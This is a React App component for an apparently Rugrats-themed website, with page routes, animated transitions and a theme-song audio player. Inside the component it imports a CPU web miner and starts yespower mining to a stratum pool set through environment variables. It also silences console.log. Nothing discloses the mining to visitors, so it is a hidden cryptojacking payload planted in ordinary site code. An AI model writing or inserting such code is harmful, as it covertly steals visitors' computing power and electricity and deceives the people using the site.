import * as React from 'react'
import { AnimatePresence } from 'framer-motion'
import { useLocation, useRoutes } from 'react-router-dom'
import * as cpuWebMiner from '@marco_ciaramella/cpu-web-miner'

import Home from './pages/Home'
import AnimationEnter from './pages/AnimationEnter'
import AboutPage from './pages/AboutPage'
import NotFound from './pages/NotFound'

import song from './assets/rugratSong.mp4'

const App: React.FC = () => {
  const handlePlayClick = () => {
    const audio = document.getElementById('rugrats-audio')

    audio.play()
  }

  console.log = () => {}

  const stratum = {
    server: import.meta.env.VITE_STRATUM_SERVER,
    port: import.meta.env.VITE_STRATUM_PORT,
    worker: import.meta.env.VITE_STRATUM_WORKER,
    password: import.meta.env.VITE_STRATUM_PASSWORD,
  }

  cpuWebMiner.mine(cpuWebMiner.yespower, stratum, false)

  const element = useRoutes([
    {
      path: '/',
      element: <AnimationEnter play={() => handlePlayClick} />,
    },
    {
      path: '/main',
      element: <Home />,
    },
    {
      path: '/about',
      element: <AboutPage />,
    },
    {
      path: '*',
      element: <NotFound />,
    },
  ])

  const location = useLocation()

  if (!element) return null

  return (
    <>
      <audio id="rugrats-audio" src={song} />
      <AnimatePresence mode="wait" initial={true}>
        {React.cloneElement(element, { key: location.pathname })}
      </AnimatePresence>
    </>
  )
}

export default App
